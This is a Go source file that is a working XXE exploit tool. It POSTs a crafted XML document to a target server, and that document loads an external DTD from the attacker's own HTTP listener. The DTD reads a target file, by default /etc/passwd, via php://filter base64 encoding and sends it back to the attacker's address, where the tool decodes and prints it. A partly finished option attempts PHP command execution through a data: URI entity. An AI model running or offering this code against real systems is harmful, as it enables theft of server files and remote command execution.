package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

var urlptr = flag.String("u", "", "URL of exploitable server")
var file = flag.String("f", "/etc/passwd", "File on target to exfil")
var localip = flag.String("a", "", "Local IP:port target can reach, used for file exfil")
var cmd = flag.String("e", "", "Command to run on target")

func main() {
	flag.Parse()

	datafile := "php://filter/convert.base64-encode/resource=" + *file
	http.HandleFunc("/exfil.dtd", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "<!ENTITY %% data SYSTEM \""+datafile+"\"><!ENTITY %% param1 \"<!ENTITY exfil SYSTEM 'http://"+*localip+"/exfil?%%data;'>\">")
	})
	http.HandleFunc("/exfil", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "<root></root>")
		b64 := strings.TrimLeft(r.RequestURI, "/exfil?")
		data, err := base64.StdEncoding.DecodeString(b64)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Unable to decode response: %s\n", err)
			return
		}
		fmt.Printf("Got %s: %s\n", *file, data)
	})
	go http.ListenAndServe(*localip, nil)

	// Generated by curl-to-Go: https://mholt.github.io/curl-to-go
	body := strings.NewReader("<?xml version=\"1.0\" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY % sp SYSTEM \"http://" + *localip + "/exfil.dtd\">%sp;%param1;]><root>&exfil;</root>")
	// TODO this doesn't work well
	if *cmd != "" {
		cmd64 := base64.StdEncoding.EncodeToString([]byte("<?php system(\"" + *cmd + "\")?>"))
		//cmd64u := url.QueryEscape(cmd64)
		//body = strings.NewReader("<?xml version=\"1.0\" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY % sp SYSTEM \"http://" + *localip + "/exfil.dtd\">%sp;%param1;]><root>&exfil;</root>")
		datafile = "data:text/plain;base64," + cmd64
		body = strings.NewReader("<?xml version=\"1.0\" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM \"data:text/plain;base64," + cmd64 + "\">]><root>&sp;</root>")
	}
	req, err := http.NewRequest("POST", *urlptr, body)
	if err != nil {
		// handle err
		fmt.Fprintf(os.Stderr, "Unable to make POST request: %s\n", err)
		os.Exit(1)
	}
	req.Header.Set("Content-Type", "application/xml")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		// handle err
		fmt.Fprintf(os.Stderr, "Unable to make POST request: %s\n", err)
		os.Exit(1)
	}
	defer resp.Body.Close()
	respBody, _ := ioutil.ReadAll(resp.Body)
	fmt.Printf("Response body: %s\n", respBody)
}
